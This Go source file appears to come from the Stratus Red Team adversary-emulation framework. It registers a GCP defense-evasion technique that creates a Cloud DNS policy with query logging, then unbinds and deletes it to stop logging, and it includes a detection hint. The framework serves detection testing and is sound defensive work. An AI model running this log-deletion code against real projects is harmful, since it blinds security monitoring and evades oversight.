package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"log"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	dns "google.golang.org/api/dns/v1"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.defense-evasion.delete-dns-logs",
		FriendlyName: "Delete a Cloud DNS Logging Policy",
		Description: `
Deletes a Cloud DNS policy that has query logging enabled.
Cloud DNS policies with logging record all DNS queries from VMs in the associated
networks to Cloud Logging, providing visibility into DNS-based communication.

Warm-up:

- Create a VPC network
- Create a Cloud DNS policy with query logging enabled, attached to the VPC network

Detonation:

- Delete the Cloud DNS policy, stopping query logging for the associated network

References:

- https://cloud.google.com/dns/docs/monitoring
- https://cloud.google.com/dns/docs/reference/v1/policies/delete
`,
		Detection: `
Identify when a Cloud DNS policy is deleted by monitoring for
<code>dns.policies.delete</code> events in GCP Admin Activity audit logs.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.DefenseEvasion},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	policyName := params["policy_name"]
	projectId := providers.GCP().GetProjectId()

	dnsService, err := dns.NewService(context.Background(), providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to instantiate Cloud DNS client: %w", err)
	}

	// GCP refuses to delete a DNS policy that is still bound to networks.
	// Patch the policy with an empty networks list to unbind it first.
	log.Printf("Unbinding Cloud DNS logging policy %s from all networks\n", policyName)
	_, err = dnsService.Policies.Patch(projectId, policyName, &dns.Policy{
		Networks:        []*dns.PolicyNetwork{},
		ForceSendFields: []string{"Networks"},
	}).Do()
	if err != nil {
		return fmt.Errorf("failed to unbind DNS policy %s from networks: %w", policyName, err)
	}

	log.Printf("Deleting Cloud DNS logging policy %s\n", policyName)
	err = dnsService.Policies.Delete(projectId, policyName).Do()
	if err != nil {
		return fmt.Errorf("failed to delete DNS policy %s: %w", policyName, err)
	}

	log.Printf("Successfully deleted Cloud DNS logging policy %s\n", policyName)
	return nil
}
